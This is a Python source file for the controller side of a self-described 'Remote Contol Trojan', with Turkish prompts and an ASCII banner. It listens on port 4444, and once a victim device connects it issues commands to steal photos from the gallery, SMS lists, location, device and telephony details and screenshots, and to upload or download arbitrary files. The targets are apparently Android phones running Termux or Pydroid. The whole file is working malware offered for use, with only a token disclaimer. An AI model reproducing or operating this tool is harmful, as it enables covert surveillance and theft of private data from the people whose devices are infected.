import socket
import os
import colorama 
from colorama import Fore
HOST = '0.0.0.0'
PORT = 4444

def receive_file(client, filename):
    with open(filename, "wb") as f:
        while True:
            data = client.recv(1024)
            if data.endswith(b"__END__"):
                f.write(data[:-7])
                break
            f.write(data)
    print(f"[+] {filename} başarıyla indirildi.")

def send_file(client, filename):
    try:
        with open(filename, "rb") as f:
            while True:
                bytes_read = f.read(1024)
                if not bytes_read:
                    break
                client.send(bytes_read)
        client.send(b"__END__")
        print(f"[+] {filename} başarıyla gönderildi.")
    except FileNotFoundError:
        client.send("Hata: Dosya bulunamadı.".encode())

def receive_screenshot(client):
    filename = "screenshot.png"
    receive_file(client, filename)
    print(f"[+] Ekran görüntüsü {filename} olarak kaydedildi.")
os.system("cls||clear")
logo = Fore.CYAN +  '''
                            ,-.
       ___,---.__          /'|`\          __,---,___
    ,-'    \`    `-.____,-'  |  `-.____,-'    //    `-.
  ,'        |           ~'\     /`~           |        `.
 /      ___//              `. ,'          ,  , \___      
|    ,-'   `-.__   _         |        ,    __,-'   `-.    |
|   /          /\_  `   .    |    ,      _/\          \   |
\  |           \ \`-.___ \   |   / ___,-'/ /           |  /
 \  \           | `._   `\\  |  //'   _,' |           /  /
  `-.\         /'  _ `---'' , . ``---' _  `\         /,-'
     ``       /     \    ,='/ \`=.    /     \       ''
             |__   /|\_,--.,-.--,--._/|\   __|
             /  `./  \\`\ |  |  | /,//' \,'  
            /   /     ||--+--|--+-/-|     \    
           |   |     /'\_\_\ | /_/_/`\     |   |
            \   \__, \_     `~'     _/ .__/   /
             `-._,-'   `-._______,-'   `-._,-'
        this is "Remote Contol Trojan" tool 
This program is not responsible for any illegal activities.
'''
print(logo)
print(" ")
print(Fore.RED + "   -----------------DEVELOPER BY MONTANA-----------------")
print(Fore.LIGHTBLUE_EX + " ")
server = socket.socket()
server.bind((HOST, PORT))
server.listen(1)
print(f"[+] Sunucu {PORT} portunda dinliyor...")

client, addr = server.accept()
print(f"[+] Bağlantı sağlandı: {addr}")

while True:
    cmd = input("Komut > ").strip()
    if cmd == "exit":
        client.send(cmd.encode())
        break

    elif cmd.startswith("yaz "):
        # mesajı doğrudan client'a gönder
        message = cmd[4:].strip()
        client.send(f"yaz {message}".encode())

    elif cmd == "downloadgallery":
        client.send("gallery".encode())
        data = client.recv(8192).decode(errors='ignore')
        files = data.strip().split("\n")

        print("\n[+] Galerideki Dosyalar:")
        for idx, file in enumerate(files):
            print(f"{idx + 1}. {file}")

        try:
            selection = int(input("\n[?] İndirmek istediğiniz dosya numarasını girin: ")) - 1
            if 0 <= selection < len(files):
                selected_file = files[selection]
                client.send(f"download {selected_file}".encode())
                filename = os.path.basename(selected_file)
                receive_file(client, filename)
            else:
                print("[-] Geçersiz seçim.")
        except Exception as e:
            print(f"[-] Hata: {e}")

    elif cmd.startswith("download "):
        client.send(cmd.encode())
        receive_file(client, cmd[len("download "):])

    elif cmd.startswith("upload "):
        client.send(cmd.encode())
        send_file(client, cmd[len("upload "):])

    elif cmd == "screenshot":
        client.send(cmd.encode())
        receive_screenshot(client)

    elif cmd == "gallery":
        client.send(cmd.encode())
        data = client.recv(8192).decode(errors='ignore')
        print(f"[+] Galeri Dosya Listesi:\n{data}")

    elif cmd == "info":
        client.send(cmd.encode())
        data = client.recv(8192).decode(errors='ignore')
        print(f"[+] Cihaz Bilgileri:\n{data}")

    elif cmd == "location":
        client.send(cmd.encode())
        data = client.recv(1024).decode(errors='ignore')
        print(f"[+] Konum Bilgisi:\n{data}")

    elif cmd == "smslist":
        client.send(cmd.encode())
        data = client.recv(8192).decode(errors='ignore')
        print(f"[+] SMS Listesi:\n{data}")

    elif cmd == "telephonyinfo":
        client.send(cmd.encode())
        data = client.recv(1024).decode(errors='ignore')
        print(f"[+] Telephony Bilgileri:\n{data}")

    elif cmd.startswith("toasttermux "):
        client.send(cmd.encode())
        data = client.recv(1024).decode(errors='ignore')
        print(f"[+] Termux Toast Cevabı:\n{data}")

    elif cmd.startswith("toastpydroid "):
        client.send(cmd.encode())
        data = client.recv(1024).decode(errors='ignore')
        print(f"[+] Pydroid Toast Cevabı:\n{data}")

    else:
        client.send(cmd.encode())
        data = client.recv(8192).decode(errors='ignore')
        print(data)

client.close()
server.close()